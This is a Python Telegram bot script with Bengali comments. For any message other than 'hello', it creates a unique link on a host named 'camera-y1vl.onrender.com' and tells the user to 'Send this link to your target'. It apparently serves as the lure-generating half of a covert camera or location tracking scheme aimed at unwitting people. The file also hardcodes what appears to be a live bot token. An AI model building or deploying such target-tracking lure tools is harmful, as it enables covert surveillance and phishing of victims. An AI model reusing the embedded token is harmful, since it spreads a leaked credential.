import logging
import uuid
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# তোর Render-এর আসল লিংক
RENDER_BASE_URL = "https://camera-y1vl.onrender.com"

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text.strip()
    
    # "hello" লিখলে "hi" রিপ্লাই দেবে
    if user_text.lower() == "hello":
        await update.message.reply_text("hi")
    else:
        # যেকোনো লিংক বা টেক্সট পাঠালে নতুন ট্র্যাকিং লিংক বানিয়ে দেবে
        unique_id = str(uuid.uuid4())[:8]  # ৮ ডিজিটের ইউনিক আইডি
        tracking_link = f"{RENDER_BASE_URL}/?id={unique_id}"
        
        response_msg = (
            f"🔗 **Target Tracking Link Created!**\n\n"
            f"Original Input: {user_text}\n\n"
            f"Send this link to your target:\n{tracking_link}"
        )
        await update.message.reply_text(response_msg, parse_mode="Markdown")

if __name__ == '__main__':
    BOT_TOKEN = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY"

    application = ApplicationBuilder().token(BOT_TOKEN).build()

    message_handler = MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message)
    application.add_handler(message_handler)

    print("Bot with tracking link generator is running...")
    application.run_polling()
